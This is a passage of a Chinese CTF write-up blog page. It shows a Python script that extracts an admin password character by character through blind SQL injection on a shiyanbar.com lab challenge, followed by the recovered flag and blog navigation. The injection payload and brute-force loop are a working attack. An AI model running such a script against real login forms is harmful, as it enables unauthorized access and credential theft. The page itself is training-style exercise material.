+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">  url1=url+payload </span><br><span class="line">  a=<span class="string">&#x27;登陆失败&#x27;</span></span><br><span class="line">  <span class="comment">#print url1  </span></span><br><span class="line">  r = requests.get(url1).content</span><br><span class="line">  <span class="comment">#print r</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">len</span>(r)==<span class="number">775</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">9</span>):    </span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> s:        </span><br><span class="line">    payload = <span class="string">&#x27;admin\&#x27; AND substr((password),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+c+<span class="string">&#x27;\&#x27; -- &amp;pass=admin&amp;action=login&#x27;</span>     </span><br><span class="line">    <span class="comment">#print payload</span></span><br><span class="line">    <span class="keyword">if</span> check(payload):</span><br><span class="line">      flag += c</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>在编码方面卡了一阵，最后用len()求长度解决了。</p>
+<p>用admin和爆破出来的密码登陆就是flag。</p>
+<p>flag：<code>!@#WwwN5f0cu5coM</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/07/11/%E7%81%AB%E7%A7%8DCTF%20Writeup/" rel="prev" title="火种CTF Writeup">
+      <i class="fa fa-chevron-left"></i> 火种CTF Writeup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/09/18/%E5%AE%9E%E9%AA%8C%E5%90%A7(%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%81%E6%9D%82%E9%A1%B9%E3%80%81%E9%9A%90%E5%86%99%E9%83%A8%E5%88%86)Writeup/" rel="next" title="实验吧(密码学、杂项、隐写部分)Writeup">
+      实验吧(密码学、杂项、隐写部分)Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E5%A4%A7%E6%B3%95"><span class="nav-number">1.</span> <span class="nav-text">PHP大法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NSCTF-web200"><span class="nav-number">2.</span> <span class="nav-text">NSCTF web200</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E4%BA%86"><span class="nav-number">3.</span> <span class="nav-text">忘记密码了</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E4%B8%AA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%9C%89%E7%82%B9%E7%AE%80%E5%8D%95"><span class="nav-number">4.</span> <span class="nav-text">这个看起来有点简单!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">上传绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A9%E7%BD%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="nav-number">6.</span> <span class="nav-text">天网管理系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Once-More"><span class="nav-number">7.</span> <span class="nav-text">Once More</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5"><span class="nav-number">8.</span> <span class="nav-text">简单的sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A9%E4%B8%8B%E6%AD%A6%E5%8A%9F%E5%94%AF%E5%BF%AB%E4%B8%8D%E7%A0%B4"><span class="nav-number">9.</span> <span class="nav-text">天下武功唯快不破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Forbidden"><span class="nav-number">10.</span> <span class="nav-text">Forbidden</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%B9%8B2"><span class="nav-number">11.</span> <span class="nav-text">简单的sql注入之2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%B9%8B3"><span class="nav-number">12.</span> <span class="nav-text">简单的sql注入之3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Guess-Next-Session"><span class="nav-number">13.</span> <span class="nav-text">Guess Next Session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98"><span class="nav-number">14.</span> <span class="nav-text">程序逻辑问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E9%99%86%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%97"><span class="nav-number">15.</span> <span class="nav-text">登陆一下好吗??</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BB"><span class="nav-number">16.</span> <span class="nav-text">让我进去</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%A0%E7%BC%BA%E6%80%9D%E6%B1%80%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-number">17.</span> <span class="nav-text">因缺思汀的绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FALSE"><span class="nav-number">18.</span> <span class="nav-text">FALSE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Forms"><span class="nav-number">19.</span> <span class="nav-text">Forms</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%9C%89%E7%82%B9%E9%9A%BE"><span class="nav-number">20.</span> <span class="nav-text">看起来有点难</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Windylh</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.izilong.net/" title="http:&#x2F;&#x2F;blog.izilong.net&#x2F;" rel="noopener" target="_blank">Zilong's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://p0sec.net/" title="https:&#x2F;&#x2F;p0sec.net&#x2F;" rel="noopener" target="_blank">p0's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://p0desta.com/" title="http:&#x2F;&#x2F;p0desta.com&#x2F;" rel="noopener" target="_blank">p0desta's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mengsec.com/" title="https:&#x2F;&#x2F;mengsec.com&#x2F;" rel="noopener" target="_blank">Mengchen's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://keysking.github.io/" title="https:&#x2F;&#x2F;keysking.github.io&#x2F;" rel="noopener" target="_blank">Keysking's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://lanvnal.com/" title="http:&#x2F;&#x2F;lanvnal.com&#x2F;" rel="noopener" target="_blank">LANVNAL's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://0sec.com.cn/" title="http:&#x2F;&#x2F;0sec.com.cn&#x2F;" rel="noopener" target="_blank">Fazx's blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
